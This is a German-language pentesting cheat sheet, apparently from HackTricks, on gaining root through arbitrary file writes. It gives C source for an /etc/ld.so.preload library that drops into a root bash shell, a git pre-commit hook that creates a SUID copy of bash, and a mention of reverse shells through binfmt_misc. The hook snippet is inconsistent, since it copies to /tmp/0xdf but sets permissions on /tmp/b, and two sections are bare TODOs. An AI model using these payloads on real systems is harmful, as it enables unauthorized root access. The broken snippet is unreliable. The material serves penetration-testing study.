# Arbiträre Dateischreibung auf Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die Umgebungsvariable **`LD_PRELOAD`**, funktioniert jedoch auch bei **SUID-Binärdateien**.\
Wenn Sie sie erstellen oder ändern können, können Sie einfach einen **Pfad zu einer Bibliothek hinzufügen, die mit jeder ausgeführten Binärdatei geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git-Hooks

[**Git-Hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository ausgeführt werden, wie z.B. wenn ein Commit erstellt wird, ein Merge... Wenn also ein **privilegiertes Skript oder Benutzer** diese Aktionen häufig ausführt und es möglich ist, in den `.git`-Ordner zu **schreiben**, kann dies für **Privesc** genutzt werden.

Zum Beispiel ist es möglich, ein **Skript** in einem Git-Repo im **`.git/hooks`** zu **generieren**, sodass es immer ausgeführt wird, wenn ein neuer Commit erstellt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zeitdateien

TODO

### Dienst- & Socket-Dateien

TODO

### binfmt_misc

Die Datei, die sich in `/proc/sys/fs/binfmt_misc` befindet, gibt an, welches Binärprogramm welche Art von Dateien ausführen soll. TODO: Überprüfen Sie die Anforderungen, um dies auszunutzen, um eine Reverse-Shell auszuführen, wenn ein gängiger Dateityp geöffnet ist.

{{#include ../../banners/hacktricks-training.md}}
